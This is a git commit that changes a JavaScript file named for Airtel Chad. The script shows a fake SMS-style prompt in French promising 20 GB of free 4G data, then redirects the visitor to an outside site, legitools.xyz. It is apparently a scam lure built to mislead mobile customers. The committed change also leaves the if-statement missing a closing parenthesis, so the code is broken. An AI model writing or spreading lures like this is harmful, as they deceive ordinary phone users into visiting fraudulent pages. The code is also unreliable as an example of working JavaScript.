ac62539f22dcf4c17b4c4ae82c419268d10c29d3
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-10-15 18:11:43 +0100

    Update airtelchad-20go.js

--- airtelchad-20go.js
+++ airtelchad-20go.js
@@ -1,5 +1,5 @@
 var password = '20 Go de données gratuites'
 password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 20 Go de données gratuites RÉCOMPENSE DE CARTE SIM 4G, veuillez appuyer sur OK pour ACTIVER. ','20 Go de données gratuites');
-if (password != '10GB Free Data') {
+if (password != '120 Go de données gratuites' {
 location.href='https://legitools.xyz/airtelchad-20go.html';
 }
